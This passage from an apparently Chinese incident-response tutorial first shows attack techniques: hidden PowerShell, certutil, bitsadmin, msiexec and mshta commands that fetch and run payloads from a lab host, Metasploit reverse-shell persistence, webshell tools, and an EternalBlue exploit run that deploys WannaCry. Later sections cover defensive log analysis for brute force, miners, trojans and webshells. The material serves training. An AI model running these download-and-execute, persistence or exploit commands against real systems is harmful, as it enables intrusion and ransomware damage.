<pre class="src src-sh">powershell -nop -w hidden -c <span style="color: #8b2252;">"IEX ((new-object net.webclient).downloadstring('http://192.168.85.1/one.exe'))"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:e0d3e37a-6e4e-4b23-af50-86283f941a20" class="outline-4">
<h4 id="h:e0d3e37a-6e4e-4b23-af50-86283f941a20">Bitsadmin</h4>
<div class="outline-text-4" id="text-h:e0d3e37a-6e4e-4b23-af50-86283f941a20">
<p>
bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">bitsadmin /transfer n http://192.168.85.1/one.exe .<span style="color: #8b2252;">\</span>
</pre>
</div>


<figure id="org31ed417">
<img src="./images/img_20230817_133742.png" alt="img_20230817_133742.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:60c828e5-7c43-4253-83fd-6f3b2b3d1090" class="outline-4">
<h4 id="h:60c828e5-7c43-4253-83fd-6f3b2b3d1090">certutil</h4>
<div class="outline-text-4" id="text-h:60c828e5-7c43-4253-83fd-6f3b2b3d1090">
<p>
用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。<br>
</p>

<p>
注：缓存目录为："%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content"<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#19979;&#36733;&#25991;&#20214;</span>
certutil -urlcache -split -f http://192.168.85.1/one.exe one.exe
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21024;&#38500;&#32531;&#23384;</span>
certutil -urlcache -split -f http://192.168.85.1/one.exe one.exe delete
</pre>
</div>


<figure id="org53c558a">
<img src="./images/img_20230817_133936.png" alt="img_20230817_133936.png" width="60%"><br>

</figure>



<figure id="org33965bf">
<img src="./images/img_20230817_134003.png" alt="img_20230817_134003.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:eb0a9ced-2dd6-40f6-adf2-becbc562c802" class="outline-4">
<h4 id="h:eb0a9ced-2dd6-40f6-adf2-becbc562c802">msiexec</h4>
<div class="outline-text-4" id="text-h:eb0a9ced-2dd6-40f6-adf2-becbc562c802">
<p>
msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#25104;msi&#21253;&#20316;&#29992;&#26159;&#25191;&#34892;calc.exe</span>
msfvenom -p windows/exec <span style="color: #a0522d;">CMD</span>=<span style="color: #8b2252;">'calc.exe'</span> -f msi &gt; calc.msi
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36828;&#31243;&#25191;&#34892;</span>
msiexec /q /i http://192.168.85.1/calc.msi
</pre>
</div>

<p>
生成msi包<br>
</p>


<figure id="org39d7c85">
<img src="./images/img_20230817_134122.png" alt="img_20230817_134122.png" width="60%"><br>

</figure>

<p>
远程执行<br>
</p>


<figure id="org92b44ae">
<img src="./images/img_20230817_134134.png" alt="img_20230817_134134.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:31a4d5cd-9513-4200-b80a-802754bd7849" class="outline-4">
<h4 id="h:31a4d5cd-9513-4200-b80a-802754bd7849">mshta</h4>
<div class="outline-text-4" id="text-h:31a4d5cd-9513-4200-b80a-802754bd7849">
<p>
mshta用于执行.hta文件，而hta是HTML Applocation 的缩写，也就是HTML应用程序。而hta中也支持VBS。所以我们可以利用hta来下载文件。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">mshta http://192.168.85.1/run.hta
</pre>
</div>


<figure id="org914b248">
<img src="./images/img_20230817_134207.png" alt="img_20230817_134207.png" width="60%"><br>

</figure>

<p>
run.hta内容为：<br>
</p>
<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">HTML</span>&gt;
&lt;<span style="color: #0000ff;">meta</span> <span style="color: #a0522d;">http-equiv</span>=<span style="color: #8b2252;">"Content-Type"</span> <span style="color: #a0522d;">content</span>=<span style="color: #8b2252;">"text/html; charset=utf-8"</span>&gt;
&lt;<span style="color: #0000ff;">HEAD</span>&gt;
  &lt;<span style="color: #0000ff;">script</span> <span style="color: #a0522d;">language</span>=<span style="color: #8b2252;">"VBScript"</span>&gt;
    Window.ReSizeTo 0, 0
    Window.moveTo -2000,-2000
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "calc.exe" // &#36825;&#37324;&#22635;&#20889;&#21629;&#20196;
    self.close
  &lt;/<span style="color: #0000ff;">script</span>&gt;
  &lt;<span style="color: #0000ff;">body</span>&gt;
    demo
&lt;/<span style="color: #0000ff;">body</span>&gt;
&lt;/<span style="color: #0000ff;">HEAD</span>&gt;
&lt;/<span style="color: #0000ff;">HTML</span>&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b" class="outline-3">
<h3 id="h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b">渗透测试框架权限维持技术</h3>
<div class="outline-text-3" id="text-h:36fd9f6b-9d03-47f4-9bdf-85ff4495777b">
<p>
MSF维持权限的使用前提是先获得一个meterpreter shell，通过meterpreter shell获取持久性shell的方法如下：<br>
</p>
</div>
<div id="outline-container-h:4315d3f2-4cb0-426e-a7f4-c6942d761779" class="outline-4">
<h4 id="h:4315d3f2-4cb0-426e-a7f4-c6942d761779">Persistence模块</h4>
<div class="outline-text-4" id="text-h:4315d3f2-4cb0-426e-a7f4-c6942d761779">
<p>
通过启动项启动（persistence）的方式，在目标机器上以反弹回连。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">-U&#65306;&#35774;&#32622;&#21518;&#38376;&#22312;&#29992;&#25143;&#30331;&#24405;&#21518;&#33258;&#21551;&#21160;&#12290;&#35813;&#26041;&#24335;&#20250;&#22312; HKCU\Software\Microsoft\Windows\CurrentVersion\Run &#19979;&#28155;&#21152;&#27880;&#20876;&#34920;&#20449;&#24687;&#12290;
-X&#65306;&#35774;&#32622;&#21518;&#38376;&#22312;&#31995;&#32479;&#21551;&#21160;&#21518;&#33258;&#21551;&#21160;&#12290;&#35813;&#26041;&#24335;&#20250;&#22312; HKLM\Software\Microsoft\Windows\CurrentVersion\Run &#19979;&#28155;&#21152;&#27880;&#20876;&#34920;&#20449;&#24687;&#12290;&#36825;&#37324;&#21487;&#33021;&#20250;&#30001;&#20110;&#29615;&#22659; &#38382;&#39064;&#65292;&#23548;&#33268;&#28155;&#21152;&#22833;&#36133;&#65292;&#21518;&#38376;&#23558;&#26080;&#27861;&#21551;&#21160;&#12290;
-S&#65306;&#20316;&#20026;&#26381;&#21153;&#33258;&#21160;&#21551;&#21160;&#20195;&#29702;&#31243;&#24207;&#65288;&#20855;&#26377;SYSTEM&#26435;&#38480;&#65289;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">run persistence -X -i 5 -p 9999 -r IP -P windows/x64/meterpreter/reverse_tcp
</pre>
</div>

<p>
-i 设置回连的时间间隔<br>
-p 设置监控的端口，windows没有被占用的端口<br>
-r kali 服务器的地址<br>
</p>


<figure id="orgad574af">
<img src="./images/img_20230817_134541.png" alt="img_20230817_134541.png" width="60%"><br>

</figure>

<p>
生成的相关文件位置 ：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21518;&#38376;&#25991;&#20214;&#20301;&#32622;&#65306;</span>
C:\Windows\Temp C:\Users\Administrator\AppData\Local\Temp
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27880;&#20876;&#34920;&#20301;&#32622;&#65306;</span>
HKCU\Software\Microsoft\Windows\CurrentVersion\Run<span style="color: #8b2252;">\</span>
HKLM\Software\Microsoft\Windows\CurrentVersion\Run<span style="color: #8b2252;">\</span>
</pre>
</div>


<figure id="org05b03e6">
<img src="./images/img_20230817_134643.png" alt="img_20230817_134643.png" width="60%"><br>

</figure>


<figure id="orgcc70b33">
<img src="./images/img_20230817_140515.png" alt="img_20230817_140515.png" width="60%"><br>

</figure>

<p>
在Kali中修改监听端口为9999，重新启动目标机器，即可再次收到会话。<br>
</p>


<figure id="orgd2aa508">
<img src="./images/img_20230817_134704.png" alt="img_20230817_134704.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-h:094b5985-c8f5-4291-a93a-06a33a248be2" class="outline-3">
<h3 id="h:094b5985-c8f5-4291-a93a-06a33a248be2">常见Webshell管理工具</h3>
<div class="outline-text-3" id="text-h:094b5985-c8f5-4291-a93a-06a33a248be2">
</div>
<div id="outline-container-h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104" class="outline-4">
<h4 id="h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104">菜刀</h4>
<div class="outline-text-4" id="text-h:8ba72ce5-0cbf-4ee5-8f05-c907a5403104">
<p>
中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理。在非简体中文环境下使用，自动切换到英文界面。UNICODE方式编译，支持多国语言输入显示。攻击特征比较明显没有做加密，容易被各安全设备检测到。<br>
</p>

<p>
工具地址：<a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a><br>
</p>


<figure id="orge544921">
<img src="./images/img_20230817_140615.png" alt="img_20230817_140615.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea" class="outline-4">
<h4 id="h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea">蚁剑</h4>
<div class="outline-text-4" id="text-h:0ec98395-b1e8-4bfe-a106-bd6d8c19b2ea">
<p>
AntSword是一个开放源代码，跨平台的网站管理工具，旨在满足渗透测试人员以及具有权限和/或授权的安全研究人员以及网站管理员的需求。<br>
工具地址：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a><br>
</p>


<figure id="orgc657dc6">
<img src="./images/img_20230817_140628.png" alt="img_20230817_140628.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:c2a5d40f-3e49-478e-ad2b-c38075584820" class="outline-4">
<h4 id="h:c2a5d40f-3e49-478e-ad2b-c38075584820">冰蝎</h4>
<div class="outline-text-4" id="text-h:c2a5d40f-3e49-478e-ad2b-c38075584820">
<p>
冰蝎是一款动态二进制加密网站管理客户端。java开发。最大的特点是会对交互的流量进行一个aes对称加密并用加密的密钥是随机生成的，客户端的流量几乎很难做检测。<br>
工具地址：<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a><br>
</p>


<figure id="org53ed3da">
<img src="./images/img_20230817_140649.png" alt="img_20230817_140649.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:336be93e-5b56-4497-9dde-f92d4f9be35c" class="outline-4">
<h4 id="h:336be93e-5b56-4497-9dde-f92d4f9be35c">哥斯拉</h4>
<div class="outline-text-4" id="text-h:336be93e-5b56-4497-9dde-f92d4f9be35c">
<p>
哥斯拉是一款优秀的权限管理工具，内置了3种Payload以及6种加密器，6种支持脚本后缀，20个内置插件。<br>
工具地址：<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a><br>
</p>


<figure id="orge53c839">
<img src="./images/img_20230817_140709.png" alt="img_20230817_140709.png" width="60%"><br>

</figure>
</div>
</div>
</div>
</section>
<section id="outline-container-h:a37c3f0c-da61-446b-a906-01ee5e3ca183" class="outline-2">
<h2 id="h:a37c3f0c-da61-446b-a906-01ee5e3ca183">Windows 实战</h2>
<div class="outline-text-2" id="text-h:a37c3f0c-da61-446b-a906-01ee5e3ca183">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>FTP 暴力破解<br></li>
<li>勒索病毒<br></li>
<li>挖矿病毒<br></li>
</ul>
</div>
<div id="outline-container-h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91" class="outline-3">
<h3 id="h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91">FTP暴力破解</h3>
<div class="outline-text-3" id="text-h:2e1d1a9c-0a75-4a2f-89bc-8749186fce91">
<p>
FTP是一个文件传输协议，用户通过FTP可从客户机程序向远程主机上传或下载文件，常用于网站代码维护、日常源码备份等。如果攻击者通过FTP匿名访问或者弱口令获取FTP权限，可直接上传webshell，进一步渗透提权，直至控制整个网站服务器。<br>
</p>

<p>
eventvwr.msc，发现大量登录任务类别。<br>
</p>


<figure id="org0d2fd4a">
<img src="./images/img_20230817_140745.png" alt="img_20230817_140745.png" width="60%"><br>

</figure>

<p>
筛选当前日志，事件id填写4625<br>
</p>


<figure id="org3aee5a2">
<img src="./images/img_20230817_140759.png" alt="img_20230817_140759.png" width="60%"><br>

</figure>

<p>
发现存在1248条，猜测服务器正在被人暴力破解。<br>
</p>


<figure id="org5456518">
<img src="./images/img_20230817_140852.png" alt="img_20230817_140852.png" width="60%"><br>

</figure>

<p>
将筛选出来的日志另存为：暴力破解<br>
</p>


<figure id="orgd765197">
<img src="./images/img_20230817_140908.png" alt="img_20230817_140908.png" width="60%"><br>

</figure>

<p>
进一步使用Log Parser对日志提取数据分析，发现攻击者使用了大量的用户名进行爆破，例如用户名：fxxx，共计进行了17826次口令尝试，攻击者基于“fxxx”这样一个域名信息，构造了一系列的用户名字典进行有针对性进行爆破，如下图：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">LogParser.exe -i:EVT <span style="color: #8b2252;">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as times,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM &#26292;&#21147;&#30772;&#35299;.evtx where EventID=4625 group by message"</span>
</pre>
</div>


<figure id="org12d6462">
<img src="./images/img_20230817_141016.png" alt="img_20230817_141016.png" width="60%"><br>

</figure>

<p>
发现EventType为8的时候攻击者进行爆破次数最多。<br>
</p>

<p>
登录类型8：为网络明文（NetworkCleartext）<br>
</p>

<p>
这种登录表明这是一个像类型3一样的网络登录，但是这种登录的密码在网络上是通过明文传输的，WindowsServer服务是不允许通过明文验证连接到共享文件夹或打印机的，通常只有当从一个使用Advapi的ASP脚本登录或者一个用户使用基本验证方式登录IIS才会是这种登录类型。“登录过程”栏都将列出Advapi。我们推测可能是FTP服务：<br>
</p>


<figure id="org0f5d069">
<img src="./images/img_20230817_141052.png" alt="img_20230817_141052.png" width="60%"><br>

</figure>

<p>
<b>应急处理措施：</b><br>
1、关闭外网FTP端口映射<br>
2、删除本地服务器FTP测试<br>
3、禁止使用FTP传输文件，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。<br>
4、更改服务器FTP默认端口。<br>
5、部署入侵检测设备，增强安全防护。<br>
</p>
</div>
</div>
<div id="outline-container-h:380cb457-03cf-4b88-86f0-bcf17077542f" class="outline-3">
<h3 id="h:380cb457-03cf-4b88-86f0-bcf17077542f">勒索病毒</h3>
<div class="outline-text-3" id="text-h:380cb457-03cf-4b88-86f0-bcf17077542f">
<p>
“永恒之蓝”利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统；被扫描到的Windows系统，只要开机上线，不要要用户进行任何操作，即可通过共享漏洞上传wannacry勒索病毒，远程控制木马等恶意程序。<br>
</p>

<p>
WannaCry是在永恒之蓝的基础上产生的，因此需要先通过永恒之蓝获得shell权限。<br>
</p>

<p>
永恒之蓝的编号是MS17-010，先使用msfconsole搜索一下漏洞模块<br>
</p>


<figure id="org9318186">
<img src="./images/img_20230817_141205.png" alt="img_20230817_141205.png" width="60%"><br>

</figure>

<p>
使用扫描模块进行扫描<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">use auxiliary/scanner/smb/smb_ms17_010
<span style="color: #483d8b;">set</span> rhosts 192.168.85.188
<span style="color: #483d8b;">set</span> rport 445

exploit
</pre>
</div>

<p>
发现目标主机存在ms17-010漏洞<br>
</p>


<figure id="orgf27cee7">
<img src="./images/img_20230817_141313.png" alt="img_20230817_141313.png" width="60%"><br>

</figure>

<p>
接下来使用攻击模块进行攻击<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">use exploit/windows/smb/ms17_010_eternalblue
<span style="color: #483d8b;">set</span> rhosts 192.168.85.188
exploit
</pre>
</div>

<p>
攻击成功，上传WannaCry病毒，upload <i>tmp/wannacry.exe c:/</i><br>
然后执行wannacry.exe，发现主机系统已经被勒索病毒攻击：<br>
</p>


<figure id="org7c94f5f">
<img src="./images/img_20230817_141510.png" alt="img_20230817_141510.png" width="60%"><br>

</figure>

<p>
一旦中了勒索病毒，文件会被锁死，没有办法正常访问了，这时候，会给使用者带来极大的困恼。为了防范这样的事情出现，我们电脑上要先做好一些防范措施：<br>
</p>
<ol class="org-ol">
<li>安装杀毒软件，保持监控开启，定期全盘扫描<br></li>
<li>及时更新 Windows安全补丁，开启防火墙临时关闭端口，如445、135、137、138、139、3389等端口<br></li>
<li>及时更新web漏洞补丁，升级web组件<br></li>
<li>备份。重要的资料一定要备份，谨防资料丢失<br></li>
<li>强化网络安全意识，陌生链接不点击，陌生文件不要下载，陌生邮件不要打开<br></li>
</ol>
</div>
</div>
<div id="outline-container-h:606725a8-8982-4693-ac45-a6a116b98cf2" class="outline-3">
<h3 id="h:606725a8-8982-4693-ac45-a6a116b98cf2">挖矿病毒</h3>
<div class="outline-text-3" id="text-h:606725a8-8982-4693-ac45-a6a116b98cf2">
<p>
随着虚拟货币的疯狂炒作，挖矿病毒已经成为不法分子利用最为频繁的攻击方式之一。病毒传播者可以利用个人电脑或服务器进行挖矿，具体现象为电脑CPU占用率高，C盘可使用空间骤降，电脑温度升高，风扇噪声增大等问题。<br>
</p>

<p>
<b>挖矿病毒案例：</b><br>
某天上午重启服务器的时候，发现程序启动很慢，打开任务管理器，发现cpu被占用接近100%，服务器资源占用严重。<br>
</p>


<figure id="orgf01f854">
<img src="./images/img_20230817_141704.png" alt="img_20230817_141704.png" width="60%"><br>

</figure>

<p>
登录网站服务器进行排查，发现多个异常进程：<br>
</p>


<figure id="org0a79482">
<img src="./images/img_20230817_141718.png" alt="img_20230817_141718.png" width="60%"><br>

</figure>

<p>
分析进程参数：wmic process get caption,commandline /value &gt;&gt; tmp.txt<br>
</p>


<figure id="org4f320dc">
<img src="./images/img_20230817_141739.png" alt="img_20230817_141739.png" width="60%"><br>

</figure>

<p>
访问该链接：<a href="http://45.123.190.178/win.txt">http://45.123.190.178/win.txt</a><br>
</p>


<figure id="orgabdb8a4">
<img src="./images/img_20230817_141755.png" alt="img_20230817_141755.png" width="60%"><br>

</figure>

<p>
Temp目录下发现Carbon、run.bat挖矿程序:<br>
</p>


<figure id="org0431f4e">
<img src="./images/img_20230817_141819.png" alt="img_20230817_141819.png" width="60%"><br>

</figure>

<p>
清除挖矿病毒：关闭异常进程、删除c盘temp目录下挖矿程序 。<br>
</p>
</div>
</div>
</section>
<section id="outline-container-h:c1741471-1dc6-42cc-9e32-9db2318148be" class="outline-2">
<h2 id="h:c1741471-1dc6-42cc-9e32-9db2318148be">Linux 实战</h2>
<div class="outline-text-2" id="text-h:c1741471-1dc6-42cc-9e32-9db2318148be">
</div>
<div id="outline-container-h:8c07cd81-c67c-4f47-b602-0575e35a8385" class="outline-3">
<h3 id="h:8c07cd81-c67c-4f47-b602-0575e35a8385">SSH暴力破解</h3>
<div class="outline-text-3" id="text-h:8c07cd81-c67c-4f47-b602-0575e35a8385">
<p>
SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。<br>
</p>

<p>
日志分析：<br>
SSH端口异常，我们首先有必要先来了解一下系统账号情况：<br>
</p>

<p>
<b>1、系统账号情况</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#38500;root&#20043;&#22806;&#65292;&#26159;&#21542;&#36824;&#26377;&#20854;&#23427;&#29305;&#26435;&#29992;&#25143;(uid &#20026;0)
[root@localhost ~]# awk -F: <span style="color: #8b2252;">'$3==0{print $1}'</span> /etc/passwd
root

2&#12289;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;
[root@localhost ~]# awk <span style="color: #8b2252;">'/\$1|\$6/{print $1}'</span> /etc/shadow
root:$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">38</span>cKfZDjsTiUe58V$<span style="color: #a0522d;">FP</span>.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nU bbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7:::
</pre>
</div>

<p>
可以确认目前系统只有一个管理用户root。<br>
/var/log/auth.log，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会进行记录。<br>
</p>

<p>
<b>2、确认攻击情况</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#32479;&#35745;&#20102;&#19979;&#26085;&#24535;&#65292;&#21457;&#29616;&#22823;&#32422;&#26377;126254&#27425;&#30331;&#24405;&#22833;&#36133;&#30340;&#35760;&#24405;&#65292;&#30830;&#35748;&#26381;&#21153;&#22120;&#36973;&#21463;&#26292;&#21147;&#30772;&#35299;
[root@localhost ~]# grep -o <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|uniq -c
    340 Failed password

2&#12289;&#36755;&#20986;&#30331;&#24405;&#29190;&#30772;&#30340;&#31532;&#19968;&#34892;&#21644;&#26368;&#21518;&#19968;&#34892;&#65292;&#30830;&#35748;&#29190;&#30772;&#26102;&#38388;&#33539;&#22260;&#65306;
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|head -1
Apr 17 02:49:50 iZf4lv0p98ie33Z sshd[2254791]: Failed password for invalid user suprodip from 81.200.212.13 port 53142 ssh2
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|tail -1
Apr 20 07:58:27 iZf4lv0p98ie33Z sshd[2309531]: Failed password for invalid user dspace from 92.255.85.135 port 58190 ssh2

3&#12289;&#36827;&#19968;&#27493;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65311;
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|grep -E -o <span style="color: #8b2252;">"(25[0- 5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0- 5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c | sort -nr
173 31.184.198.71
12 31.184.198.71
7 147.182.139.154
6 103.47.50.211
... ...

4&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#37117;&#26377;&#21738;&#20123;&#65311;
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|perl -e <span style="color: #8b2252;">'while($_= &lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span>|uniq -c|sort -nr
135 invalid user 111111
18 invalid user 123
15 invalid user
12 invalid user 123
11 root
3 root
... ...
</pre>
</div>
</div>
</div>
<div id="outline-container-h:db79cc82-db3f-40da-9805-1c94bd82a73c" class="outline-3">
<h3 id="h:db79cc82-db3f-40da-9805-1c94bd82a73c">DDOS病毒</h3>
<div class="outline-text-3" id="text-h:db79cc82-db3f-40da-9805-1c94bd82a73c">
<p>
现象描述：某服务器网络资源异常，感染该木马病毒的服务器会占用网络带宽，甚至影响网络业务正常应用。<br>
</p>

<p>
系统分析：针对日志服务器病毒事件进行排查，在开机启动项/etc/rc.d/rc.local发现可疑的sh.sh脚本，进一步跟踪sh.sh脚本，这是一个检测病毒存活的脚本。<br>
</p>

<p>
在root目录下发现存活检测脚本<br>
</p>


<figure id="orgcf55f6e">
<img src="./images/img_20230817_142352.png" alt="img_20230817_142352.png" width="60%"><br>

</figure>

<p>
解决步骤<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#32467;&#26463;&#36827;&#31243;ps aux | grep <span style="color: #8b2252;">"conf.m"</span> | grep -v grep | awk &#8216;{<span style="color: #483d8b;">print</span> $<span style="color: #a0522d;">2</span>}&#8216;| xargs kill -9

2&#12289;&#28165;&#38500;&#33258;&#21160;&#21551;&#21160;&#33050;&#26412;vim /etc/rc.local &#21435;&#25481; sh /etc/chongfu.sh &amp;

3&#12289;&#28165;&#38500; &#33050;&#26412; rm -rf /etc/chongfu.sh /tem/chongfu.sh

4&#12289;&#20462;&#25913;&#30331;&#24405;&#23494;&#30721; passwd 5&#12289;&#37325;&#21551;&#65292;reboot
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:5c22d99b-c7db-4c77-b808-3d9cd071c24f" class="outline-2">
<h2 id="h:5c22d99b-c7db-4c77-b808-3d9cd071c24f">Web 实战</h2>
<div class="outline-text-2" id="text-h:5c22d99b-c7db-4c77-b808-3d9cd071c24f">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>网站被植入 webshell<br></li>
<li>批量挂黑页<br></li>
<li>新闻源网站劫持<br></li>
<li>搜索引擎劫持<br></li>
<li>网站首页被篡改<br></li>
<li>管理员账号被篡改<br></li>
<li>编辑器入侵事件<br></li>
<li>应急响应报告模板<br></li>
</ul>
</div>
<div id="outline-container-h:d5942152-8df5-4cfb-92b9-26b8b040cb8c" class="outline-3">
<h3 id="h:d5942152-8df5-4cfb-92b9-26b8b040cb8c">网站被植入Webshell</h3>
<div class="outline-text-3" id="text-h:d5942152-8df5-4cfb-92b9-26b8b040cb8c">
<p>
<b>使用环境：Windows Server 2008 + phpstudy + DVWA</b><br>
</p>

<p>
网站被植入Webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入Webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。<br>
</p>

<p>
网站管理员在站点目录下发现存在webshell，于是开始了对入侵过程展开了分析。发现被web目录被植入了Webshell：<br>
</p>


<figure id="org9e7295c">
<img src="./images/img_20230817_142521.png" alt="img_20230817_142521.png" width="60%"><br>

</figure>

<p>
Webshell查杀工具<br>
</p>
<ul class="org-ul">
<li>D盾_Web查杀 <a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a><br></li>
<li>河马 <a href="https://www.shellpub.com">https://www.shellpub.com</a><br></li>
<li>等<br></li>
</ul>

<p>
使用方法<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz
tar xvf hm-linux-amd64.tgz
hm scan /www
</pre>
</div>

<p>
事件分析，通过发现的webshell文件创建时间点，去翻看相关日期的访问日志。<br>
</p>


<figure id="orgcfac0c9">
<img src="./images/img_20230817_144224.png" alt="img_20230817_144224.png" width="60%"><br>

</figure>

<p>
Web日志分析<br>
</p>

<p>
经过日志分析，在文件创建的时间节点发现可疑的上传接口：cat /var/log/apache2/access.log<br>
</p>


<figure id="orgbc0d369">
<img src="./images/img_20230817_144252.png" alt="img_20230817_144252.png" width="60%"><br>

</figure>

<p>
漏洞复现：访问文件上传接口<br>
</p>


<figure id="org6328101">
<img src="./images/img_20230817_144309.png" alt="img_20230817_144309.png" width="60%"><br>

</figure>

<p>
成功上传Webshell<br>
</p>


<figure id="orga45d66c">
<img src="./images/img_20230817_144326.png" alt="img_20230817_144326.png" width="60%"><br>

</figure>

<p>
漏洞修复：清除webshell并对上传接口进行代码修复。<br>
</p>
</div>
</div>
<div id="outline-container-h:bad43e8b-fba8-43d2-a4c0-707e42f7404b" class="outline-3">
<h3 id="h:bad43e8b-fba8-43d2-a4c0-707e42f7404b">批量挂黑页</h3>
<div class="outline-text-3" id="text-h:bad43e8b-fba8-43d2-a4c0-707e42f7404b">
<p>
作为一个网站管理员，你采用开源CMS做网站，比如dedecms，但是有一天，你忽然发现不知何时，网站的友情链接模块被挂大量垃圾链接，网站出现了很多不该有的目录，里面全是博彩相关的网页。而且，攻击者在挂黑页以后，会在一些小论坛注册马甲将你的网站黑页链接发到论坛，引爬虫收录。在搜索引擎搜索网站地址时，收录了一些会出现一些博彩页面，严重影响了网站形象。<br>
</p>

<p>
<b>原因分析：</b><br>
</p>

<p>
网站存在高危漏洞，常见于一些存在安全漏洞的开源CMS，利用0day批量拿站上传黑页。<br>
</p>

<p>
某网站被挂了非常多博彩链接，链接形式如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html
http://www.xxx.com/upload/aomendduchangzaixian/index.html
http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html
</pre>
</div>

<p>
链接可以访问，直接访问物理路径也可以看到文件，但是打开网站目录并没有发现这些文件，这些文件到底藏在了哪？<br>
</p>

<p>
访问这些链接，跳转到如图页面：<br>
</p>


<figure id="orga7b7e5d">
<img src="./images/img_20230817_144432.png" alt="img_20230817_144432.png" width="60%"><br>

</figure>

<p>
<b>问题处理：</b><br>
1、打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。<br>
</p>


<figure id="org36bd568">
<img src="./images/img_20230817_144512.png" alt="img_20230817_144512.png" width="60%"><br>

</figure>

<p>
